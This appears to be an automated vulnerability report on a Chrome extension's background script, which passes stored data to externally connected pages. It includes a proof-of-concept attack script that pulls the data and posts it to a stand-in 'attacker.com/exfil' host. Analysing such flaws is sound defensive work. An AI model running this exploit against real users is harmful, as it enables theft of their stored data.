# CoCo Analysis: apgofpijjmedgmabpdmoapkgpjiiipcd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → bg_external_port_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/apgofpijjmedgmabpdmoapkgpjiiipcd/opgen_generated_files/bg.js
Line 751	    var storage_local_get_source = {
Line 1118	              if(dataStore.currentObj) {

**Code:**

```javascript
// Background script - Entry point (Line 1102-1130)
chrome.runtime.onConnectExternal.addListener(function (port) {
  port.onMessage.addListener(function (message) {
    console.log('Message received', message)

    if(message.id == 'configure') {
      this.currentState = "CAPTURE_INSPECT";
      port.postMessage({
        id: "configure",
        data: "Connected"
      });
    }

    if(message.id == 'capture') {
      chrome.storage.local.get("currentObj", function(dataStore){  // Read from storage
        var savedObj = [];
        if(dataStore.currentObj) {
          savedObj = dataStore.currentObj;  // ← storage data
        }

        port.postMessage({  // ← Send storage data to external source
          id: "capture",
          data: savedObj  // ← Information disclosure sink
        });
      });
    }
  });

  port.onDisconnect.addListener(function (port) {
    this.currentState = "STOPPED";
    chrome.storage.local.set({"currentObj": {}}, function(){});
  });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onConnectExternal

**Attack:**

```javascript
// From a whitelisted domain (http://localhost:4200/ or https://*.surfaceinsight.com/)
// Per methodology: IGNORE manifest.json externally_connectable restrictions
// If even ONE domain can exploit it → TRUE POSITIVE

var port = chrome.runtime.connect("apgofpijjmedgmabpdmoapkgpjiiipcd");

port.onMessage.addListener(function(response) {
  if(response.id == "capture") {
    console.log("Stolen storage data:", response.data);
    // Exfiltrate to attacker server
    fetch("https://attacker.com/exfil", {
      method: "POST",
      body: JSON.stringify(response.data)
    });
  }
});

// Trigger the information disclosure
port.postMessage({ id: "capture" });
```

**Impact:** Information disclosure. External websites or extensions whitelisted in `externally_connectable` can read sensitive data stored in `chrome.storage.local` under the key "currentObj". Per the methodology, even though only specific domains are whitelisted, this still constitutes a TRUE POSITIVE vulnerability because the extension exposes stored data to external parties. The stored data appears to contain business process capture information based on the extension's purpose.
